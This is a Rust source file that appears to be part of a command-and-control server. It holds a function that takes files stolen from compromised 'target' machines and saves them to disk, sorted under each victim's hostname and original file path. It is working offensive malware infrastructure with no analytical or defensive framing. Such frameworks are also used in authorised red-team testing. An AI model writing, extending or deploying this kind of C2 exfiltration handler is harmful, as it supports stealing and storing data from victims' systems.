use std::path::PathBuf;

use shared::tasks::{ExfiltratedFile, Task};
use tokio::io::AsyncWriteExt;

use crate::{EXFIL_PATH, logging::log_error_async};

/// Handles an exfiltrated file from the targets machine by saving it to disk on the
/// c2 under the path c2/<hostname><path as per target machine>
pub async fn handle_exfiltrated_file(task: &mut Task) {
    if let Some(ser) = &task.metadata {
        let ef = match serde_json::from_str::<ExfiltratedFile>(ser) {
            Ok(ef) => ef,
            Err(e) => {
                // If we got an error extracting as an ExfiltratedFile, try extract as string which
                // will contain an error from the target system.
                if let Ok(_) = serde_json::from_str::<String>(ser) {
                    // Let the client deal with the error message
                    return;
                }

                log_error_async(&format!(
                    "Failed to deserialise data from exfiltrated file. {e}. Got: {:?}",
                    task.metadata
                ))
                .await;
                task.metadata = None;
                return;
            }
        };

        //
        // Construct the save path - we cannot save with C:\ in the name, so we strip this. Any other drive letter
        // should be fine (I think)
        //
        let mut save_path = String::from(EXFIL_PATH);
        save_path.push('/');
        save_path.push_str(&ef.hostname);
        save_path.push('/');
        save_path.push_str(&ef.file_path);
        let save_path = save_path.replace(r"C:\", "");
        let save_path = save_path.replace("\\", "/");

        //
        // Ensure the directory is created for the file
        //
        let mut path_as_path = PathBuf::from(&save_path);
        path_as_path.pop();
        if let Err(e) = tokio::fs::create_dir_all(path_as_path).await {
            log_error_async(&format!(
                "Failed to create folder for exfiltrated file. {e}"
            ))
            .await;
            task.metadata = None;
            return;
        };

        //
        // Create and write the file
        //
        let f = tokio::fs::File::options()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&save_path)
            .await;

        let mut f = match f {
            Ok(f) => f,
            Err(e) => {
                log_error_async(&format!("Failed to create file after exfil. {e}")).await;

                task.metadata = None;
                return;
            }
        };

        if let Err(e) = f.write_all(&ef.file_data).await {
            log_error_async(&format!("Failed to write exfiltrated file data. {e}")).await;
        };
    }

    // Finally, remove the enclosed vec - we do not want to store this result in the db
    task.metadata = None;
}
